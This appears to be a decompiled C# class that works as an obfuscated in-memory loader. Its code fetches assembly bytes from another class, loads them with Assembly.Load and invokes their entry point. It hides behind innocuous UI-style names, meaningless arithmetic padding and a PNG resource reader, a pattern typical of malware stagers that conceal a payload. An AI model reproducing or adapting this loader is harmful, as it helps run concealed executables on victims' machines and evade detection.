using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;

public class CoreResponseData
{
	public static ImageFormat arizona = ImageFormat.get_Png();

	public static Assembly open = Assembly.Load(BarDropDown.DataGridState());

	public static MethodInfo mentry = Assembly.Load(BarDropDown.DataGridState()).EntryPoint;

	public static object RangePositionInfo(Assembly assembly, MethodInfo entryPoint)
	{
		return assembly.CreateInstance(XsdDuration(entryPoint));
	}

	public static void ImageCodecInfo(Assembly assembly, MethodInfo entryPoint)
	{
		entryPoint.Invoke(RangePositionInfo(assembly, entryPoint), null);
	}

	public static string XsdDuration(MethodInfo entryPoint)
	{
		return (string)IPropertyNotifySink(entryPoint);
	}

	public static void ScrollProperties()
	{
		UserControl();
	}

	internal static object IPropertyNotifySink(object asm)
	{
		return ((MemberInfo)asm).Name;
	}

	internal static bool UserControl()
	{
		ImageCodecInfo(open, mentry);
		int num = Convert.ToInt32(-1433291581.0);
		if ((Convert.ToInt32(1203523324.0 + Math.Tanh(601761662.5)) ^ Convert.ToInt32(624719393.0)) == Convert.ToInt32(1652541586.8236046 + Math.Sqrt(826285166.0)))
		{
			Convert.ToInt32(2.761594155955765 - Math.Tanh(1.0));
			num += Convert.ToInt32(716645791.0 + Math.Floor(716645791.0));
		}
		return (byte)num != 0;
	}

	internal static bool CallSiteHelpers()
	{
		int num = Convert.ToInt32(-1461717357.0);
		if ((Convert.ToInt32(117125740.0) ^ Convert.ToInt32(698230674.0)) == Convert.ToInt32(795153918.0))
		{
			Convert.ToInt32(3.0 - Math.Round(1.0));
			num += Convert.ToInt32(1461717356.3381479 + Math.Sin(730858678.5));
		}
		return (byte)num != 0;
	}

	public static Image getResourceImg(Assembly asm)
	{
		using (Stream stream = asm.GetManifestResourceStream("NativeVersionInfo.png"))
		{
			if (stream != null)
			{
				return Image.FromStream(stream);
			}
		}
		return null;
	}
}
